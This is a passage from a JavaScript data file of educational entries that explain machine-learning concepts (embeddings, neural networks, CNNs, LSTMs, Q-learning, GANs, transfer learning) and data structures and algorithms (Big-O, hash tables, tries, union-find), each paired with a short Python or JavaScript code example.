    content: 'Embeddings convert text into fixed-size numerical vectors where similar meanings are close in vector space. Generated by models like text-embedding-3-small (1536 dims) or sentence-transformers (384-768 dims). Used for semantic search, clustering, classification, and anomaly detection. Cosine similarity measures distance: 1.0 = identical, 0.0 = unrelated, -1.0 = opposite. Batch API calls reduce costs for large datasets.',
    example: `# OpenAI embeddings
from openai import OpenAI
import numpy as np

client = OpenAI()

# Single embedding
response = client.embeddings.create(
    model="text-embedding-3-small",
    input="The quick brown fox jumps over the lazy dog"
)
embedding = response.data[0].embedding
print(f"Dimensions: {len(embedding)}")  # 1536

# Batch embeddings
texts = ["Machine learning", "Deep learning", "Cooking recipes"]
response = client.embeddings.create(
    model="text-embedding-3-small",
    input=texts
)
embeddings = [e.embedding for e in response.data]

# Similarity
def cosine_similarity(a, b):
    return np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b))

# ML vs DL = high similarity
# ML vs cooking = low similarity
print(cosine_similarity(embeddings[0], embeddings[1]))  # ~0.85
print(cosine_similarity(embeddings[0], embeddings[2]))  # ~0.20`
  },

  // ═══════════════════════════════════════════
  // ARTIFICIAL INTELLIGENCE — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Machine Learning Pipeline',
    category: 'Artificial Intelligence',
    subcategory: 'Fundamentals',
    description: 'End-to-end workflow from data collection to model deployment.',
    content: 'ML pipeline: (1) Data collection → (2) Data cleaning → (3) Feature engineering → (4) Train/validation/test split → (5) Model selection → (6) Training → (7) Evaluation → (8) Hyperparameter tuning → (9) Deployment → (10) Monitoring. Use pipelines (scikit-learn Pipeline, TFX) for reproducibility. Data leakage (using test data in training) is a common pitfall. Cross-validation provides robust evaluation estimates.',
    example: `# scikit-learn pipeline
from sklearn.pipeline import Pipeline
from sklearn.preprocessing import StandardScaler
from sklearn.decomposition import PCA
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import cross_val_score

# Build pipeline (prevents data leakage)
pipe = Pipeline([
    ("scaler", StandardScaler()),      # Step 1: scale features
    ("pca", PCA(n_components=10)),     # Step 2: reduce dimensions
    ("classifier", RandomForestClassifier(n_estimators=100))
])

# Cross-validate entire pipeline
scores = cross_val_score(pipe, X, y, cv=5, scoring="accuracy")
print(f"Accuracy: {scores.mean():.3f} (+/- {scores.std():.3f})")

# Fit and predict
pipe.fit(X_train, y_train)
predictions = pipe.predict(X_test)

# Tune hyperparameters
from sklearn.model_selection import GridSearchCV
param_grid = {
    "pca__n_components": [5, 10, 20],
    "classifier__n_estimators": [50, 100, 200]
}
grid = GridSearchCV(pipe, param_grid, cv=5)
grid.fit(X_train, y_train)`
  },
  {
    title: 'Neural Networks',
    category: 'Artificial Intelligence',
    subcategory: 'Fundamentals',
    description: 'Computational models inspired by biological neurons.',
    content: 'Neural networks consist of layers of interconnected nodes (neurons). Input layer receives data, hidden layers transform it, output layer produces predictions. Each connection has a weight, each neuron applies an activation function (ReLU, sigmoid, tanh). Training adjusts weights via backpropagation and gradient descent to minimize a loss function. Hyperparameters: learning rate, batch size, epochs, layer sizes, regularization.',
    example: `# Simple neural network with PyTorch
import torch
import torch.nn as nn

class NeuralNet(nn.Module):
    def __init__(self, input_size, hidden_size, output_size):
        super().__init__()
        self.network = nn.Sequential(
            nn.Linear(input_size, hidden_size),
            nn.ReLU(),
            nn.Dropout(0.2),
            nn.Linear(hidden_size, hidden_size),
            nn.ReLU(),
            nn.Linear(hidden_size, output_size)
        )

    def forward(self, x):
        return self.network(x)

model = NeuralNet(784, 256, 10)
criterion = nn.CrossEntropyLoss()
optimizer = torch.optim.Adam(model.parameters(), lr=0.001)

# Training loop
for epoch in range(10):
    for batch_x, batch_y in dataloader:
        outputs = model(batch_x)
        loss = criterion(outputs, batch_y)
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()`
  },
  {
    title: 'CNNs',
    category: 'Artificial Intelligence',
    subcategory: 'Advanced',
    description: 'Convolutional Neural Networks for spatial data like images.',
    content: 'CNNs use convolutional layers that slide filters over input to detect features (edges, textures, objects). Key layers: Conv2d (feature extraction), Pooling (downsampling), Flatten, Dense (classification). Filters learn hierarchical features: early layers detect edges, deeper layers detect shapes/objects. architectures: LeNet, AlexNet, VGG, ResNet (skip connections), EfficientNet. Transfer learning from pretrained models is standard practice.',
    example: `# CNN for image classification
import torch.nn as nn

class CNN(nn.Module):
    def __init__(self, num_classes=10):
        super().__init__()
        self.features = nn.Sequential(
            nn.Conv2d(3, 32, kernel_size=3, padding=1),
            nn.ReLU(),
            nn.MaxPool2d(2),
            nn.Conv2d(32, 64, kernel_size=3, padding=1),
            nn.ReLU(),
            nn.MaxPool2d(2),
            nn.Conv2d(64, 128, kernel_size=3, padding=1),
            nn.ReLU(),
            nn.AdaptiveAvgPool2d((1, 1))
        )
        self.classifier = nn.Sequential(
            nn.Flatten(),
            nn.Linear(128, 64),
            nn.ReLU(),
            nn.Linear(64, num_classes)
        )

    def forward(self, x):
        x = self.features(x)
        return self.classifier(x)

# Transfer learning with pretrained model
import torchvision.models as models
model = models.resnet18(pretrained=True)
model.fc = nn.Linear(model.fc.in_features, 10)  # new classifier`
  },
  {
    title: 'RNNs & LSTMs',
    category: 'Artificial Intelligence',
    subcategory: 'Advanced',
    description: 'Recurrent networks for sequential data with memory.',
    content: 'RNNs process sequences by maintaining hidden state — each step depends on previous steps. Standard RNNs suffer from vanishing gradients (can\'t learn long-range dependencies). LSTMs add gates (forget, input, output) to control information flow. GRUs are simplified LSTMs. Used for time series, NLP, music generation. Transformers have largely replaced RNNs for NLP, but RNNs still useful for streaming/real-time data.',
    example: `# LSTM for sequence prediction
import torch.nn as nn

class LSTMModel(nn.Module):
    def __init__(self, input_size, hidden_size, num_layers, output_size):
        super().__init__()
        self.lstm = nn.LSTM(
            input_size=input_size,
            hidden_size=hidden_size,
            num_layers=num_layers,
            batch_first=True,
            dropout=0.2
        )
        self.fc = nn.Linear(hidden_size, output_size)

    def forward(self, x):
        # x shape: (batch, seq_len, features)
        lstm_out, (h_n, c_n) = self.lstm(x)
        # Use last hidden state
        last_hidden = lstm_out[:, -1, :]
        return self.fc(last_hidden)

model = LSTMModel(input_size=1, hidden_size=64, num_layers=2, output_size=1)

# Time series: predict next value
# Input: 30 days of prices → Output: day 31 price`
  },
  {
    title: 'Reinforcement Learning',
    category: 'Artificial Intelligence',
    subcategory: 'Advanced',
    description: 'Learning optimal actions through trial and error with rewards.',
    content: 'RL learns a policy (state → action mapping) that maximizes cumulative reward. Agent interacts with environment, observes state, takes action, receives reward. Key concepts: exploration vs exploitation, discount factor (gamma), Q-value (expected return), policy gradient. Algorithms: Q-learning, DQN, PPO, A3C. Applications: game playing (AlphaGo), robotics, autonomous driving, recommendation systems.',
    example: `# Simple Q-learning
import numpy as np

class QLearningAgent:
    def __init__(self, n_states, n_actions, lr=0.1, gamma=0.99, epsilon=0.1):
        self.q_table = np.zeros((n_states, n_actions))
        self.lr = lr
        self.gamma = gamma
        self.epsilon = epsilon
        self.n_actions = n_actions

    def choose_action(self, state):
        if np.random.random() < self.epsilon:
            return np.random.randint(self.n_actions)  # explore
        return np.argmax(self.q_table[state])  # exploit

    def update(self, state, action, reward, next_state, done):
        if done:
            target = reward
        else:
            target = reward + self.gamma * np.max(self.q_table[next_state])

        self.q_table[state, action] += self.lr * (target - self.q_table[state, action])

# Training loop
agent = QLearningAgent(n_states=16, n_actions=4)
for episode in range(1000):
    state = env.reset()
    total_reward = 0
    while True:
        action = agent.choose_action(state)
        next_state, reward, done, _ = env.step(action)
        agent.update(state, action, reward, next_state, done)
        state = next_state
        total_reward += reward
        if done:
            break`
  },
  {
    title: 'NLP',
    category: 'Artificial Intelligence',
    subcategory: 'Applied',
    description: 'Natural Language Processing — enabling machines to understand human language.',
    content: 'NLP combines linguistics and ML for text processing. Tasks: tokenization (split text), POS tagging, named entity recognition, sentiment analysis, text classification, machine translation, summarization, question answering. Traditional: TF-IDF, bag-of-words. Modern: word embeddings (Word2Vec, GloVe), transformer models (BERT, GPT). Pre-trained models with fine-tuning dominate modern NLP.',
    example: `# NLP with Hugging Face transformers
from transformers import pipeline

# Sentiment analysis
classifier = pipeline("sentiment-analysis")
result = classifier("I love this product! It's amazing!")
print(result)  # [{'label': 'POSITIVE', 'score': 0.9998}]

# Named entity recognition
ner = pipeline("ner", grouped_entities=True)
entities = ner("Elon Musk founded SpaceX in California")
print(entities)
# [{'entity_group': 'PER', 'word': 'Elon Musk'},
#  {'entity_group': 'ORG', 'word': 'SpaceX'},
#  {'entity_group': 'LOC', 'word': 'California'}]

# Text generation
generator = pipeline("text-generation", model="gpt2")
output = generator("The future of AI is", max_length=50, num_return_sequences=3)

# Summarization
summarizer = pipeline("summarization")
summary = summarizer(long_article, max_length=150, min_length=50)`
  },
  {
    title: 'GANs',
    category: 'Artificial Intelligence',
    subcategory: 'Advanced',
    description: 'Generative Adversarial Networks — two networks competing to generate realistic data.',
    content: 'GANs consist of a Generator (creates fake data) and Discriminator (distinguishes real from fake). They train adversarially — generator improves at fooling discriminator, discriminator improves at detecting fakes. Applications: image generation, style transfer, data augmentation, deepfakes. Training is unstable (mode collapse, vanishing gradients). Variants: DCGAN (convolutional), StyleGAN (high-quality faces), CycleGAN (unpaired translation), Pix2Pix (paired translation).',
    example: `# Simplified GAN architecture
import torch.nn as nn

class Generator(nn.Module):
    def __init__(self, latent_dim=100, img_dim=784):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(latent_dim, 256),
            nn.LeakyReLU(0.2),
            nn.Linear(256, 512),
            nn.LeakyReLU(0.2),
            nn.Linear(512, img_dim),
            nn.Tanh()
        )

    def forward(self, z):
        return self.net(z)

class Discriminator(nn.Module):
    def __init__(self, img_dim=784):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(img_dim, 512),
            nn.LeakyReLU(0.2),
            nn.Dropout(0.3),
            nn.Linear(512, 256),
            nn.LeakyReLU(0.2),
            nn.Dropout(0.3),
            nn.Linear(256, 1),
            nn.Sigmoid()
        )

    def forward(self, img):
        return self.net(img)

# Training: alternate between D and G
criterion = nn.BCELoss()
for epoch in range(epochs):
    # Train Discriminator
    real_loss = criterion(D(real_images), real_labels)
    fake_loss = criterion(D(G(noise)), fake_labels)
    d_loss = real_loss + fake_loss

    # Train Generator
    g_loss = criterion(D(G(noise)), real_labels)  # fool D`
  },
  {
    title: 'Transfer Learning',
    category: 'Artificial Intelligence',
    subcategory: 'Advanced',
    description: 'Leveraging pre-trained models to solve new but related problems.',
    content: 'Transfer learning reuses a model trained on one task for a different but related task. Benefits: less data needed, faster training, better performance. Strategies: Feature extraction (freeze base model, train new head), Fine-tuning (unfreeze some layers, low learning rate). Choose pre-trained model similar to your domain. NLP: BERT, GPT. Vision: ResNet, EfficientNet. Audio: Whisper. Always check the model\'s license for commercial use.',
    example: `# Transfer learning with PyTorch
import torch
import torch.nn as nn
import torchvision.models as models

# Load pretrained ResNet
model = models.resnet50(pretrained=True)

# Freeze all layers
for param in model.parameters():
    param.requires_grad = False

# Replace classifier for your task
num_classes = 5
model.fc = nn.Sequential(
    nn.Linear(model.fc.in_features, 256),
    nn.ReLU(),
    nn.Dropout(0.3),
    nn.Linear(256, num_classes)
)

# Only train new layers
optimizer = torch.optim.Adam(
    filter(lambda p: p.requires_grad, model.parameters()),
    lr=0.001
)

# Fine-tune later: unfreeze top layers
for param in model.layer4.parameters():
    param.requires_grad = True
optimizer = torch.optim.Adam(model.parameters(), lr=0.0001)

# Hugging Face approach
from transformers import AutoModelForImageClassification
model = AutoModelForImageClassification.from_pretrained(
    "microsoft/resnet-50",
    num_labels=5,
    ignore_mismatched_sizes=True
)`
  },

  // ═══════════════════════════════════════════
  // DSA — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Big-O Notation',
    category: 'DSA',
    subcategory: 'Fundamentals',
    description: 'Measuring algorithm efficiency in terms of time and space complexity.',
    content: 'Big-O describes upper bound of growth rate. O(1) = constant, O(log n) = logarithmic, O(n) = linear, O(n log n) = linearithmic, O(n²) = quadratic, O(2ⁿ) = exponential, O(n!) = factorial. Always consider worst case. Drop constants and lower-order terms. Space complexity measures extra memory. Multiple variables: O(n + m). Amortized analysis (e.g., dynamic array push) averages over operations.',
    example: `// O(1) — constant
function getFirst(arr) { return arr[0]; }

// O(log n) — logarithmic
function binarySearch(arr, target) {
  let lo = 0, hi = arr.length - 1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    if (arr[mid] === target) return mid;
    arr[mid] < target ? lo = mid + 1 : hi = mid - 1;
  }
  return -1;
}

// O(n) — linear
function findMax(arr) {
  let max = arr[0];
  for (const val of arr) max = Math.max(max, val);
  return max;
}

// O(n²) — quadratic
function bubbleSort(arr) {
  for (let i = 0; i < arr.length; i++)
    for (let j = 0; j < arr.length - i - 1; j++)
      if (arr[j] > arr[j+1]) [arr[j], arr[j+1]] = [arr[j+1], arr[j]];
}

// O(n log n) — linearithmic (merge sort, JS sort)`
  },
  {
    title: 'Hash Tables',
    category: 'DSA',
    subcategory: 'Fundamentals',
    description: 'Key-value storage with O(1) average lookup using hash functions.',
    content: 'Hash tables map keys to values via a hash function that computes an index into an array of buckets. Collisions handled by chaining (linked lists) or open addressing (linear/quadratic probing). Load factor (n/capacity) determines when to resize. Amortized O(1) for get/set/delete. Worst case O(n) with many collisions. JavaScript Objects and Maps, Python dicts, Java HashMaps all use hash tables.',
    example: `// Hash table implementation (simplified)
class HashTable {
  constructor(size = 53) {
    this.buckets = Array.from({ length: size }, () => []);
  }

  _hash(key) {
    let total = 0;
    for (let i = 0; i < key.length; i++) {
      total = (total * 31 + key.charCodeAt(i)) % this.buckets.length;
    }
    return total;
  }

  set(key, value) {
    const idx = this._hash(key);
    const bucket = this.buckets[idx];
    const existing = bucket.find(([k]) => k === key);
    if (existing) existing[1] = value;
    else bucket.push([key, value]);
  }

  get(key) {
    const bucket = this.buckets[this._hash(key)];
    const pair = bucket.find(([k]) => k === key);
    return pair ? pair[1] : undefined;
  }

  delete(key) {
    const idx = this._hash(key);
    this.buckets[idx] = this.buckets[idx].filter(([k]) => k !== key);
  }
}`
  },
  {
    title: 'Binary Search Trees',
    category: 'DSA',
    subcategory: 'Fundamentals',
    description: 'Ordered tree structure with O(log n) average operations.',
    content: 'BST property: left child < parent < right child. Enables O(log n) search, insert, delete (average). In-order traversal yields sorted order. Balanced BSTs (AVL, Red-Black) guarantee O(log n) worst case. Unbalanced BSTs degrade to linked list O(n). Used as building blocks for maps, sets, and priority queues. Self-balancing trees maintain height balance automatically.',
    example: `class TreeNode {
  constructor(val) {
    this.val = val;
    this.left = null;
    this.right = null;
  }
}

class BST {
  constructor() { this.root = null; }

  insert(val) {
    const node = new TreeNode(val);
    if (!this.root) { this.root = node; return; }
    let curr = this.root;
    while (true) {
      if (val < curr.val) {
        if (!curr.left) { curr.left = node; return; }
        curr = curr.left;
      } else {
        if (!curr.right) { curr.right = node; return; }
        curr = curr.right;
      }
    }
  }

  search(val) {
    let curr = this.root;
    while (curr) {
      if (val === curr.val) return true;
      curr = val < curr.val ? curr.left : curr.right;
    }
    return false;
  }

  // In-order: left, root, right (sorted)
  inorder(node = this.root, result = []) {
    if (node) {
      this.inorder(node.left, result);
      result.push(node.val);
      this.inorder(node.right, result);
    }
    return result;
  }
}`
  },
  {
    title: 'Graph Algorithms',
    category: 'DSA',
    subcategory: 'Fundamentals',
    description: 'Traversing and analyzing networks of nodes and edges.',
    content: 'Graphs model relationships. Representations: adjacency matrix O(V²) space, adjacency list O(V+E) space. BFS explores level by level (shortest path in unweighted graphs). DFS explores depth-first (cycle detection, topological sort). Dijkstra finds shortest paths (non-negative weights). A* uses heuristics for faster search. Topological sort orders directed acyclic graphs. Connected components identify separate groups.',
    example: `// Adjacency list representation
const graph = {
  A: ["B", "C"],
  B: ["A", "D", "E"],
  C: ["A", "F"],
  D: ["B"],
  E: ["B", "F"],
  F: ["C", "E"]
};

// BFS — shortest path (unweighted)
function bfs(graph, start) {
  const visited = new Set([start]);
  const queue = [start];
  const order = [];

  while (queue.length) {
    const node = queue.shift();
    order.push(node);
    for (const neighbor of graph[node]) {
      if (!visited.has(neighbor)) {
        visited.add(neighbor);
        queue.push(neighbor);
      }
    }
  }
  return order;
}

// DFS — cycle detection
function hasCycle(graph) {
  const visited = new Set();
  const recStack = new Set();

  function dfs(node) {
    visited.add(node);
    recStack.add(node);
    for (const neighbor of graph[node]) {
      if (!visited.has(neighbor)) {
        if (dfs(neighbor)) return true;
      } else if (recStack.has(neighbor)) return true;
    }
    recStack.delete(node);
    return false;
  }

  return Object.keys(graph).some(n => !visited.has(n) && dfs(n));
}`
  },
  {
    title: 'Dynamic Programming',
    category: 'DSA',
    subcategory: 'Advanced',
    description: 'Breaking complex problems into overlapping subproblems with optimal substructure.',
    content: 'DP solves problems by combining solutions to subproblems. Two approaches: Top-down (memoization — recursive with cache), Bottom-up (tabulation — iterative with table). Key properties: overlapping subproblems (same subproblems solved repeatedly), optimal substructure (optimal solution contains optimal sub-solutions). Common patterns: knapsack, longest common subsequence, edit distance, coin change, rod cutting.',
    example: `// Fibonacci — memoization (top-down)
function fibMemo(n, memo = {}) {
  if (n <= 1) return n;
  if (memo[n]) return memo[n];
  memo[n] = fibMemo(n-1, memo) + fibMemo(n-2, memo);
  return memo[n];
}

// Fibonacci — tabulation (bottom-up)
function fibTab(n) {
  if (n <= 1) return n;
  const dp = [0, 1];
  for (let i = 2; i <= n; i++) {
    dp[i] = dp[i-1] + dp[i-2];
  }
  return dp[n];
}

// 0/1 Knapsack
function knapsack(weights, values, capacity) {
  const n = weights.length;
  const dp = Array.from({ length: n + 1 }, () => Array(capacity + 1).fill(0));

  for (let i = 1; i <= n; i++) {
    for (let w = 0; w <= capacity; w++) {
      dp[i][w] = dp[i-1][w]; // don't take item i
      if (weights[i-1] <= w) {
        dp[i][w] = Math.max(
          dp[i][w],
          dp[i-1][w - weights[i-1]] + values[i-1]
        );
      }
    }
  }
  return dp[n][capacity];
}`
  },
  {
    title: 'Sorting Algorithms',
    category: 'DSA',
    subcategory: 'Advanced',
    description: 'Different strategies for ordering data with varying time-space tradeoffs.',
    content: 'Comparison sorts: Bubble O(n²), Selection O(n²), Insertion O(n²) but O(n) nearly sorted. Merge sort O(n log n) stable, uses O(n) space. Quick sort O(n log n) average, O(n²) worst (mitigated by randomization). Heap sort O(n log n) in-place. Non-comparison: Counting sort O(n+k), Radix sort O(d·n). JavaScript uses TimSort (merge + insertion). Choose based on data size, constraints, and stability needs.',
    example: `// Quick Sort
function quickSort(arr, lo = 0, hi = arr.length - 1) {
  if (lo < hi) {
    const pivot = arr[hi];
    let i = lo - 1;
    for (let j = lo; j < hi; j++) {
      if (arr[j] <= pivot) {
        i++;
        [arr[i], arr[j]] = [arr[j], arr[i]];
      }
    }
    [arr[i + 1], arr[hi]] = [arr[hi], arr[i + 1]];
    const pivotIdx = i + 1;
    quickSort(arr, lo, pivotIdx - 1);
    quickSort(arr, pivotIdx + 1, hi);
  }
  return arr;
}

// Merge Sort
function mergeSort(arr) {
  if (arr.length <= 1) return arr;
  const mid = arr.length >> 1;
  const left = mergeSort(arr.slice(0, mid));
  const right = mergeSort(arr.slice(mid));
  return merge(left, right);
}

function merge(left, right) {
  const result = [];
  let i = 0, j = 0;
  while (i < left.length && j < right.length) {
    result.push(left[i] <= right[j] ? left[i++] : right[j++]);
  }
  return result.concat(left.slice(i), right.slice(j));
}

// Counting Sort (non-comparison)
function countingSort(arr) {
  const max = Math.max(...arr);
  const count = Array(max + 1).fill(0);
  for (const num of arr) count[num]++;
  const sorted = [];
  for (let i = 0; i < count.length; i++) {
    while (count[i]-- > 0) sorted.push(i);
  }
  return sorted;
}`
  },
  {
    title: 'Trie',
    category: 'DSA',
    subcategory: 'Advanced',
    description: 'Prefix tree for efficient string storage and retrieval.',
    content: 'A Trie stores strings character-by-character in a tree. Each node represents a character, paths form words. Common prefix = shared path. Operations: insert O(m), search O(m), startsWith O(m) where m = word length. Used for autocomplete, spell checking, IP routing, word games. Space-efficient for shared prefixes. Can be augmented with frequency counts for ranking suggestions.',
    example: `class TrieNode {
  constructor() {
    this.children = {};
    this.isEnd = false;
  }
}

class Trie {
  constructor() { this.root = new TrieNode(); }

  insert(word) {
    let node = this.root;
    for (const char of word) {
      if (!node.children[char]) {
        node.children[char] = new TrieNode();
      }
      node = node.children[char];
    }
    node.isEnd = true;
  }

  search(word) {
    let node = this.root;
    for (const char of word) {
      if (!node.children[char]) return false;
      node = node.children[char];
    }
    return node.isEnd;
  }

  startsWith(prefix) {
    let node = this.root;
    for (const char of prefix) {
      if (!node.children[char]) return false;
      node = node.children[char];
    }
    return true;
  }
}

// Usage
const trie = new Trie();
trie.insert("apple");
trie.insert("app");
trie.search("apple");    // true
trie.search("app");      // true
trie.startsWith("ap");   // true
trie.search("apl");      // false`
  },
  {
    title: 'Union-Find',
    category: 'DSA',
    subcategory: 'Advanced',
    description: 'Disjoint set data structure for tracking connected components.',
    content: 'Union-Find (Disjoint Set Union) manages partitions of elements into disjoint sets. Two operations: Find (which set does element belong to?), Union (merge two sets). Optimizations: Path compression (flatten tree during find), Union by rank (attach smaller tree to larger). With both optimizations, amortized O(α(n)) ≈ O(1) per operation. Used in Kruskal\'s MST, cycle detection, connected components, social network analysis.',
    example: `class UnionFind {
  constructor(n) {
    this.parent = Array.from({ length: n }, (_, i) => i);
    this.rank = Array(n).fill(0);
    this.components = n;
  }

  find(x) {
    if (this.parent[x] !== x) {
      this.parent[x] = this.find(this.parent[x]); // path compression
    }
    return this.parent[x];
  }

  union(x, y) {
    const px = this.find(x);
    const py = this.find(y);
    if (px === py) return false; // already connected

    // Union by rank
    if (this.rank[px] < this.rank[py]) {
      this.parent[px] = py;
    } else if (this.rank[px] > this.rank[py]) {
      this.parent[py] = px;
    } else {
      this.parent[py] = px;
      this.rank[px]++;
    }
    this.components--;
    return true;
  }

  connected(x, y) {
    return this.find(x) === this.find(y);
  }
}

// Kruskal's MST
function kruskal(n, edges) {
  edges.sort((a, b) => a[2] - b[2]); // sort by weight
  const uf = new UnionFind(n);
  const mst = [];

  for (const [u, v, weight] of edges) {
    if (uf.union(u, v)) {
      mst.push([u, v, weight]);
      if (mst.length === n - 1) break;
    }
  }
  return mst;
}`
  },
];
